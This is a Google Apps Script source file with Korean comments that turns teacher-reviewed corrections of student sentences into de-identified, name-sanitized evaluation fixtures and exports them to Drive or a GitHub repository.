  return { 포함: 포함.slice(0, 3), 불포함: 불포함.slice(0, 3) };
}

/* [v9.166] 강사 정답 모음 → 회화 앱(SYNK-talk) 평가 픽스처 내보내기.
 *
 * 왜 필요한가: 두 저장소가 오류태그 23종 이름만 공유하고 데이터로는 끊겨 있다. 이 통로가 없으면
 * 개원 후 실학생 교정을 **손으로 복붙**하게 되고, 손일이 된 순간 분기에 한 번 하다가 안 하게 된다.
 *
 * 🔴 나가는 것을 최소로 자른다 — student_id·fb_id·강사명·제출일·created_at을 **전부 버린다.**
 *   ① 평가에 필요한 것은 원문·교정·태그 셋뿐이다.
 *   ② 동의 v18.9는 범위 확장의 **대가로 「비식별 사용」을 약속**한 것이라 식별자 포함은 동의 위반이다.
 *   ③ 목적지가 git 저장소다 — 한 번 커밋되면 이력에서 지워지지 않는다(되돌릴 수 없는 종류의 사고).
 *   제출일까지 버리는 이유: 소수 인원에서는 날짜+반이 사실상 식별자로 동작한다.
 *
 * 두 종류를 모두 담는다 — 「AI가 틀렸다」만 모으면 재현율을 못 잰다(반쪽 채점표):
 *   · 강사교정 있음 → 기대교정 = 강사교정  (AI가 놓친 것)
 *   · 강사판정만 있고 교정 없음 → 기대교정 = AI교정  (AI가 맞았다는 강사 승인)
 *
 * ⚠ 이름이 `_`로 끝나는 이유 = 노출 표면. HtmlService 페이지가 익명에게 한 번이라도 나가면 받은 쪽이
 *   `google.script.run`으로 **밑줄 없는 전역 전부**를 원장 권한으로 부른다(실측 171개). 지금 그런 페이지는
 *   없지만, 이 함수는 「학생 문장을 파일로 만들어내는」 종류라 그 목록에 올려둘 이유가 없다.
 *   메뉴는 `menuExportGolden`이 내부에서 부르므로 밑줄이 있어도 그대로 동작한다.
 *
 * [v9.175] **문서를 만드는 곳은 여기 하나다** — 출구가 둘(드라이브·GitHub)이 되면서 분리했다.
 *   두 출구가 각자 doc을 조립하면 비식별 규칙이 한쪽에서만 갱신되는 날이 온다(그 실패는 조용하다).
 *   강사 정답 모음이 비면 **문자열**을 돌려준다 — 호출부가 그대로 사람에게 보여 준다.
 */
function 골든픽스처_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const gd = ss.getSheetByName('teacher_gold');
  if (!gd || gd.getLastRow() < 2) return '강사 정답 모음이 비어 있습니다 — 표본은 매주 월요일 배치가 뽑고, 강사 응답은 강사 화면의 「정답 모음」에서 채웁니다.';
  const tz = ss.getSpreadsheetTimeZone();
  const rows = gd.getRange(2, 1, gd.getLastRow() - 1, GOLD_HEADERS.length).getValues();
  /* [v9.312] 🔒 이름 살균 — 학생이 자유 서술 칸에 제 이름(또는 반 친구 이름)을 적은 문장은 **밖으로 안 나간다.**
   *   출구 ②의 목적지가 공개 저장소의 영구 기록이라(철학 Ⅰ ㉣ 경계 ⑧ 아래 · 저장소는 공개 유지 08-31) 되돌릴 수 없다.
   *   유호 확정 09-06 「출구는 켜 두되 살균을 먼저」 — 명단(profiles)의 이름을 못 읽으면 **살균 없이는 내보내지 않는다**
   *   (조용히 0건 살균으로 통과하는 것이 이 자리에서 가장 나쁜 실패다). 걸린 항목은 빼고 수만 남긴다. */
  const 이름들 = 명단이름_(ss);
  if (이름들 === null) return '명단(profiles)을 못 읽어 이름 살균을 못 한다 — 살균 없이는 내보내지 않는다(유호 확정 09-06 · 안전).';
  const 항목 = [];
  let 미응답 = 0, 살균제외 = 0;
  rows.forEach(r => {
    const 원문 = 역소독_(r[4]).trim();
    const ai = 역소독_(r[5]).trim();
    const 판정 = String(r[6] || '').trim();
    const 강사교정 = 역소독_(r[7]).trim();
    if (!원문) return;
    if (이름살균_(이름들, 원문 + ' ' + ai + ' ' + 강사교정)) { 살균제외++; return; }
    if (!판정 && !강사교정) { 미응답++; return; } // 강사가 아직 안 본 행 — 정답이 없으므로 픽스처가 아니다
    /* [v9.170] 정답을 정하는 것은 「판정」이다 — `강사교정 || ai`로 뭉뚱그리면 **강사가 AI를 부정한 행에서도
     *   AI교정이 정답으로 실린다.** Glide 「강사 정답 모음」 조립 중 실측된 두 경로:
     *   ①「원문이 이미 맞다」 = AI 과교정 → 정답은 원문이다. 이 행이 곧 거짓양성 검사 표본이 된다
     *      (없으면 채점표가 「고쳐야 할 것을 고쳤나」만 재고 「멀쩡한 것을 건드렸나」는 못 잰다).
     *   ②「고칠 곳이 있다」인데 교정칸이 빈 반쪽 응답 = 정답을 모른다 → 채점표에 넣지 않는다.
     *   ①을 놓치면 「AI가 틀렸다」는 강사 판정이 「AI가 맞다」는 정답으로 뒤집혀 조용히 실린다.
     *   ⚠ 판정 문자열은 GOLD_VERDICTS와 **정확히** 같아야 한다 — Glide Choice의 옵션 표가 그 원천이다
     *     (조립가이드 v947 §8-5). 모르는 문자열은 정답으로 치지 않고 미응답으로 센다. — 구 Glide(08-05 폐기 · 이관 = docs/글라이드_이관대장.md) */
    let 교정, 출처;
    if (강사교정) { 교정 = 강사교정; 출처 = '강사교정'; }
    else if (판정 === GOLD_VERDICTS[2]) { 교정 = 원문; 출처 = '원문유지_강사판정'; }
    else if (판정 === GOLD_VERDICTS[0]) { 교정 = ai; 출처 = 'AI교정_강사승인'; }
    else { 미응답++; return; }
    if (!교정) { 미응답++; return; }
    // 「원문이 이미 맞다」면 AI가 붙인 오류태그도 강사가 함께 부정한 것이다 — 기대태그를 비운다
    const 태그 = 출처 === '원문유지_강사판정' ? []
      : String(r[9] || '').split(',').map(t => t.trim()).filter(Boolean);
    const 정상 = (태그.length === 0 || (태그.length === 1 && 태그[0] === '오류없음')) && 원문 === 교정;
    const d = fixtureDiff_(원문, 교정);
    /* [v9.173] `불변`은 SYNK-talk 채점기가 **거짓양성 검사로 갈아타는 유일한 스위치**다(`if (fx.불변)`).
     *   빠뜨리면 정상 표본이 오류 항목으로 채점되는데, 오류 채점은 포함·불포함·기대태그가 모두 비면
     *   **무조건 통과**다 → 「멀쩡한 문장을 건드렸는가」가 자동 만점이 된다. 엔진이 문장을 망가뜨려도
     *   점수는 100%다. `종류: '정상'`만 내보내고 이 필드를 빠뜨린 것이 08-04 실측 결함이고,
     *   계약 파일에도 없어서 양쪽 회귀가 둘 다 못 봤다(c2에서 추가).
     *   기대태그도 함께 정규화한다 — 채점기는 정상 항목에 정확히 `['오류없음']` 하나를 요구한다. */
    /* [v9.220] `대안태그`는 **비워서 내보낸다 — 값이 아니라 「칸」이 계약이다.**
     *   계약(`계약/수집_교정_계약.json` 「대안태그_왜」)이 그대로 못박았다: 어느 태그가 대안으로
     *   옳은지는 **교육 방침 판정**이라 계약이 정하지 않고, 채우는 것은 유호님·검수자 몫이며,
     *   **비어 있으면 종전과 완전히 같게 채점된다**(talk `계약.test.js` ⑤가 그 동일성을 회귀로 지킨다).
     *   여기서 끌어올 재료는 원리상 없다 — `GOLD_HEADERS` 에 그 열이 없고(강사가 적는 칸이 아니다),
     *   자동 도출은 「동전 던지기를 채점하지 않겠다」는 이 필드의 존재 이유와 정면으로 어긋난다.
     *   🔑 그래도 **칸은 박는다**: 빠뜨리면 채점기가 `fx.대안태그 || []` 로 읽어 「검사 통과」와
     *   「검사 안 함」이 같은 모양이 된다 — 바로 위 `불변`이 겪은 v9.173 실사고와 같은 축이다. */
    항목.push({
      id: 'G' + String(항목.length + 1).padStart(3, '0'),
      종류: 정상 ? '정상' : '오류',
      출처: 출처,
      입력: 원문,
      기대태그: 정상 ? ['오류없음'] : 태그,
      기대교정: 교정,
      포함: d.포함,
      불포함: d.불포함,
      불변: 정상,
      대안태그: []
    });
  });
  const doc = {
    버전: '실측 v1',
    만든날: Utilities.formatDate(new Date(), tz, 'yyyy-MM-dd'),
    출처: 'SYNK LAB teacher_gold — 실학생 원문 + 강사 교정. 비식별(student_id·fb_id·강사명·날짜 제거).',
    /* [v9.187] 어휘 동봉 — 두 저장소는 오류태그 23종을 **이름만** 공유한다(SYNK-talk에 사본).
     * 목록 전체를 픽스처에 실어 보내면 받는 쪽이 자기 사본과 diff해 갈라짐을 그날 알 수 있다
     * (안 실으면 한쪽이 태그를 늘린 날부터 채점기가 모르는 태그를 조용히 오답 처리한다). */
    어휘: HW_ERROR_TAGS,
    한계: [
      '표본은 무작위이지만 **우리 학원 학생**의 분포다 — 몽골어 화자 일반의 분포가 아니다.',
      '「포함/불포함」은 어절 diff로 자동 도출한 것이라 비어 있을 수 있다. 빈 배열은 그 검사를 건너뛴다(추측해 넣지 않는다).',
      '거짓양성 검사가 부족하면 정상 문장을 따로 보태야 한다 — 아래 종류별 수를 보고 판단할 것.',
      '「대안태그」는 이 판에서 **전부 비어 있다** — 어느 태그가 대안으로 옳은지는 교육 방침 판정이라 여기서 자동으로 못 채운다(비면 종전과 완전히 같게 채점된다). ⚠ 이 파일은 내보낼 때마다 **통째로 덮인다** — 채운다면 이 파일이 아니라 손으로 관리하는 픽스처에 채워야 다음 판에 안 지워진다.'
    ],
    항목: 항목
  };
  const 정상수 = 항목.filter(x => x.종류 === '정상').length;
  /* [v9.174] 채점기가 「판정불가」로 빼는 항목을 **내보내는 쪽에서도 센다.** 오류 항목인데
   *   포함·불포함·기대태그가 모두 비면 대조할 근거가 없다(전면 재작성 + 오류태그 공란).
   *   그런 항목은 SYNK-talk 채점에서 분모에서 빠지므로, 「30건 내보냄」이 30건 채점 가능으로
   *   읽히면 **표본 부족이 점수로 위장된다.** 숫자를 내는 자리에서 미리 갈라 준다. */
  const 채점불가 = 항목.filter(x => x.종류 === '오류' && !x.포함.length && !x.불포함.length && !x.기대태그.length).length;
  doc.한계.push('이번 판: 오류 ' + (항목.length - 정상수) + ' · 정상 ' + 정상수 + ' · 강사 미응답으로 제외 ' + 미응답
    + '건 · 채점 불가 ' + 채점불가 + '건(대조 근거가 없어 채점 분모에서 빠진다 — 강사 교정을 더 받아야 한다)'
    + ' · 이름 살균으로 제외 ' + 살균제외 + '건(명단 ' + 이름들.length + '개 이름과 대조 — 학생이 제 이름을 적은 문장은 밖으로 안 나간다).');
  return { doc: doc, 요약: '정상 ' + 정상수 + ' · 채점불가 ' + 채점불가 + ' · 미응답 제외 ' + 미응답 + ' · 이름 살균 제외 ' + 살균제외,
    건수: 항목.length, 살균제외: 살균제외, 살균이름수: 이름들.length, tz: tz };
}

/* [v9.312] 명단의 이름 조각 — profiles 의 이름 칸 «둘»(B 한글 표기 · C 몽골어 표기)과 exit_log 의 이름 칸(퇴소한 학생)을
 *   어절로 쪼개 두 글자 이상만 모은다(한 글자는 조사·어미와 겹쳐 오탐). 보안 검토 09-06 이 짚은 사각 둘 — ①「Баяр」·「Bayar」는
 *   B 열 「바야르」와 안 겹친다 ②퇴소자는 profiles 에서 지워지는데 teacher_gold 의 그 문장은 남는다(6개월 주기 사이에 새는 자리).
 *   못 읽으면 null — 「이름 0개」와 「명단을 못 읽었다」는 다른 얼굴이라 갈라 낸다(빈 명단은 [] · profiles 시트 없음은 null). */
function 명단이름_(ss) {
  const pf = ss.getSheetByName('profiles');
  if (!pf) return null;
  const 조각 = {};
  const 담기 = (v) => String(v || '').split(/[\s·,()（）\/\-\u0027\u2019]+/).forEach(t => {
    const s = t.trim();
    if (s.length >= 2) 조각[s.toLowerCase()] = 1;
  });
  if (pf.getLastRow() >= 2) pf.getRange(2, 1, pf.getLastRow() - 1, 4).getValues().forEach(r => {
    if (!r[0] || r[3] !== 'student') return;
    담기(r[1]); 담기(r[2]);
  });
  /* 퇴소 학생 — exit_log 의 이름 칸 «둘»(B 한글 · H 이름_몽골 · 후자는 v9.312 부터 syncProfiles 가 남긴다). 시트가 없으면 그 층은 0
   *   (이름 0 이 아니라 시트 0). 코덱스 09-06 P1: 한글·몽골어 표기가 다른 학생이 퇴소하면 profiles 의 C 칸이 사라져 사전에서 빠졌다. */
  const ex = ss.getSheetByName('exit_log');
  if (ex && ex.getLastRow() >= 2) ex.getRange(2, 1, ex.getLastRow() - 1, 8).getValues().forEach(r => { if (r[0]) { 담기(r[1]); 담기(r[7]); } });
  return Object.keys(조각);
}

/* [v9.312] 문장에 명단 이름 조각이 들어 있나 — 대소문자 무시 · 부분 일치(「바트야」·「Bat-Erdene」 꼴을 다 잡는다). */
function 이름살균_(이름들, 글) {
  const s = String(글 || '').toLowerCase();
  if (!s) return false;
  for (let i = 0; i < 이름들.length; i++) if (s.indexOf(이름들[i]) !== -1) return true;
  return false;
}

/* [v9.312] 문항 지문 — 스위프가 붙인 «문제|정답»의 짧은 해시(12자). 문항이 없으면 빈 문자열(「지문 없음」과 「빈 문항의 지문」을 안 섞는다).
 *   quiz_log 의 「노출 판」 대용이다 — 뒤에 문항을 고치면 지문이 갈려 「이 답이 어느 판을 봤나」를 되짚을 수 있다. */
function 문항지문_(문제, 정답) {
  const s = String(문제 || '') + '|' + String(정답 || '');
  if (s === '|') return '';
  const bytes = Utilities.computeDigest(Utilities.DigestAlgorithm.MD5, s, Utilities.Charset.UTF_8);
  let hex = '';
  for (let i = 0; i < 6; i++) hex += ('0' + ((bytes[i] + 256) % 256).toString(16)).slice(-2);
  return hex;
}

/* [v9.175] 출구 ① 내 드라이브 JSON. 손으로 받아 옮기는 경로 — 출구 ②(GitHub)가 막혔을 때의 대비책이다. */
function exportGoldenFixture_() {
  const r = 골든픽스처_();
  if (typeof r === 'string') return r;
  const name = 'SYNK_골든픽스처_' + Utilities.formatDate(new Date(), r.tz, 'yyyyMMdd') + '.json';
  const file = DriveApp.createFile(name, JSON.stringify(r.doc, null, 2), MimeType.PLAIN_TEXT);
  const msg = '픽스처 ' + r.건수 + '건 내보냄(' + r.요약 + ')\n파일: ' + name
    + '\n내 드라이브에서 받아 SYNK-talk의 evals/ 에 넣으면 교정 엔진 채점에 바로 씁니다.';
  Logger.log(msg + '\n' + file.getUrl());
  return msg;
}

/* ═══════════ [v9.175] 출구 ② 픽스처를 SYNK-talk 저장소에 직접 올린다 ═══════════
 * 왜: 이 루프는 **6개월마다 한 번** 돈다. 드라이브에서 받아 옮기는 손 절차는 그 주기에서 가장 잘
 *   잊히는 종류다 — 2년에 네 번뿐이라 습관이 되지 않는다. 손일이 된 순간 「분기에 한 번 하다가
 *   안 하게 된다」가 v9.166 주석에 이미 적혀 있었는데, 그 손일을 우리가 만들고 있었다.
 *
 * 🔒 안전 설계 — 이 함수는 **바깥으로 나가는 쓰기**다. 네 가지로 가둔다:
 *   ① **바깥에서 들어오는 문은 만들지 않는다.** 웹앱(doGet)을 열어 저쪽이 당겨가게 하면 프로젝트의
 *      밑줄 없는 전역 전부가 노출 표면이 된다(실측 171개). 나가는 쪽만 만들면 그 표면이 0이다.
 *   ② **토큰은 소스에 없다** — 스크립트 속성에서 읽고, 로그·반환문에 절대 싣지 않는다.
 *   ③ **대상이 상수다** — 소유자·저장소·경로·브랜치를 인자로 받지 않는다. 잘못 조준할 여지를 없앤다.
 *      ⚠ 대상 저장소는 08-04 엔 비공개였으나 **지금은 공개다**(08-29 실측 · 유호 확정 08-31 「공개 유지」 — CI 축). 그래서 09-06 에
 *      이름 살균(`명단이름_`·`이름살균_`)이 이 출구의 선행이 됐고, 기본은 이 버튼이 아니라 출구 ①(내 드라이브 · 비공개 파일)이다.
 *   ④ **자동 배치에 넣지 않는다** — 메뉴에서 사람이 누를 때만 돈다. 비가역 외부 실행이라 그 클릭이 승인이다.
 * ⚠ 이름이 `_`로 끝나는 이유는 exportGoldenFixture_와 같다(노출 표면 최소화). */
const GH_OWNER = 'unmet23-lab';
const GH_REPO = 'SYNK-talk';
const GH_PATH = 'evals/픽스처_실학생.json';   // 합성 픽스처(evals/픽스처.json)를 덮지 않는다 — 둘은 다른 질문에 답한다
const GH_BRANCH = 'master';
const GH_TOKEN_KEY = 'GITHUB_TOKEN_SYNKTALK';

/* [v9.177] 연결만 확인한다 — **읽기 전용**(GET /repos), 아무것도 쓰지 않는다.
 * 왜 따로 있나: 이 설치는 강사 정답 모음에 데이터가 있어야 GitHub까지 가는데, 데이터는 개원 뒤에나 쌓인다.
 *   그러면 **토큰이 진짜 되는지를 6개월 뒤에 처음 알게 된다** — 그때 틀렸으면 그 판을 통째로 놓친다.
 *   설치한 날 확인할 수 있어야 설치가 끝난 것이다.
 * 실패를 **구별해서** 말한다 — 401(값이 잘렸거나 만료) / 404(저장소가 토큰 범위 밖) / 권한 부족은
 *   각각 고치는 곳이 다르다. "실패했습니다" 한 줄이면 어디를 고칠지 모른다. */
function 골든전송점검_() {
  const token = PropertiesService.getScriptProperties().getProperty(GH_TOKEN_KEY);
  if (!token) return { ok: false, msg: '토큰이 없습니다 — 스크립트 속성 ' + GH_TOKEN_KEY + ' (절차: docs/골든픽스처_자동전송_설치.md)' };
  const res = UrlFetchApp.fetch('https://api.github.com/repos/' + GH_OWNER + '/' + GH_REPO, {
    headers: { Authorization: 'Bearer ' + token, Accept: 'application/vnd.github+json' },
    muteHttpExceptions: true
  });
  const code = res.getResponseCode();
  if (code === 401) return { ok: false, msg: '토큰이 거부됐습니다(401) — 값이 잘려 들어갔거나 만료됐습니다. 새로 발급해 속성 값만 바꾸세요.' };
  if (code === 404) return { ok: false, msg: '저장소가 안 보입니다(404) — 토큰의 Repository access에 ' + GH_REPO + '이 들어갔는지 확인하세요.' };
  if (code !== 200) return { ok: false, msg: 'GitHub 응답 ' + code + ' — ' + res.getContentText().slice(0, 120) };
  const p = JSON.parse(res.getContentText()).permissions || {};
  if (!p.push) return { ok: false, msg: '읽기는 되는데 쓰기 권한이 없습니다 — 토큰 Permissions의 Contents를 「Read and write」로 바꾸세요.' };
  return { ok: true, msg: '연결 OK — ' + GH_OWNER + '/' + GH_REPO + ' 쓰기 권한 확인(⚠ 공개 저장소 — 올리면 영구 기록 · 이름 살균이 먼저 돈다 · 기본은 「내 드라이브」 버튼).' };
}

/* [v9.179] 설치 확인 — **공개**로 둔다(밑줄이 없다). 이유는 노출 표면 계산이 아니라 가용성이다:
 *   밑줄 함수는 편집기 드롭다운에 안 뜨고, 메뉴는 시트 UI가 필요한데 이 스프레드시트는 무거워
 *   원격에서 못 여는 날이 있다(08-04 실측: 렌더러 정지 45초 타임아웃). **확인 수단이 하나뿐이면
 *   그 하나가 막힌 날 설치가 맞는지 영영 모른다** — 그리고 이 설치는 6개월 뒤에나 증상이 난다.
 * 노출 판정: 읽기 전용(GET /repos)이고 토큰도 다른 비밀도 돌려주지 않는다. 상태 변경 0. */
function checkGoldenPush() {
  const c = 골든전송점검_();
  const msg = (c.ok ? '✅ ' : '⚠️ ') + c.msg;
  Logger.log(msg);
  return msg;
}

function pushGoldenFixture_() {
  const token = PropertiesService.getScriptProperties().getProperty(GH_TOKEN_KEY);
  if (!token) return 'GitHub 토큰이 없습니다 — 설정 절차는 docs/골든픽스처_자동전송_설치.md 에 클릭 단위로 있습니다.\n'
    + '(스크립트 속성 이름: ' + GH_TOKEN_KEY + ')';
  const r = 골든픽스처_();
  /* 보낼 것이 없어도 **연결은 확인해서 알려 준다** — 여기서 조용히 끝내면 설치가 맞았는지
   * 데이터가 쌓이는 6개월 뒤에나 알게 된다(그때 틀렸으면 그 판을 통째로 놓친다). */
  if (typeof r === 'string' || !r.건수) {
    const c = 골든전송점검_();
    return (typeof r === 'string' ? r : '채점에 쓸 항목이 0건이라 올리지 않았습니다(' + r.요약 + ').')
      + '\n\n' + (c.ok ? '✅ ' : '⚠️ ') + c.msg;
  }

  const api = 'https://api.github.com/repos/' + GH_OWNER + '/' + GH_REPO + '/contents/' + encodeURI(GH_PATH);
  const head = { Authorization: 'Bearer ' + token, Accept: 'application/vnd.github+json' };
  // 기존 파일이 있으면 sha가 있어야 갱신된다. 없으면(404) 새로 만든다.
  const got = UrlFetchApp.fetch(api + '?ref=' + GH_BRANCH, { headers: head, muteHttpExceptions: true });
  let sha = null;
  if (got.getResponseCode() === 200) sha = JSON.parse(got.getContentText()).sha;
  else if (got.getResponseCode() !== 404) return 'GitHub 조회 실패(' + got.getResponseCode() + ') — 토큰 권한이 contents:write 인지 확인해 주세요.';

  const body = {
    message: '골든 픽스처 갱신 — 실학생 ' + r.건수 + '건 (' + r.요약 + ')',
    content: Utilities.base64Encode(JSON.stringify(r.doc, null, 2), Utilities.Charset.UTF_8),
    branch: GH_BRANCH
  };
  if (sha) body.sha = sha;
  const put = UrlFetchApp.fetch(api, {
    method: 'put', contentType: 'application/json', headers: head,
    payload: JSON.stringify(body), muteHttpExceptions: true
  });
  const code = put.getResponseCode();
  if (code !== 200 && code !== 201) {
    // 응답 본문에는 토큰이 없지만, 혹시 모를 반향을 막으려 앞부분만 자른다
    return 'GitHub 업로드 실패(' + code + ') — ' + put.getContentText().slice(0, 200);
  }
  const msg = 'SYNK-talk에 픽스처 ' + r.건수 + '건 올렸습니다(' + r.요약 + ').\n경로: ' + GH_PATH
    + '\n⚠ ' + GH_OWNER + '/' + GH_REPO + ' 는 공개 저장소라 이 파일은 영구 기록입니다(지워도 이력에 남습니다). 기본 출구는 「📤 픽스처 파일로」(내 드라이브 · 비공개)입니다.' // [v9.312] 코덱스 09-06 P2 — 경고가 0건 갈래에만 있었다
    + '\n이름 살균: 명단 ' + r.살균이름수 + '개 이름과 대조해 ' + r.살균제외 + '건을 뺐습니다(학생이 제 이름을 적은 문장은 밖으로 안 나갑니다 · 유호 확정 09-06).'
    + '\n저쪽에서 채점: node tools/eval-score.js evals/출력_v1.json --fixture ' + GH_PATH;
  Logger.log(msg);
  return msg;
}
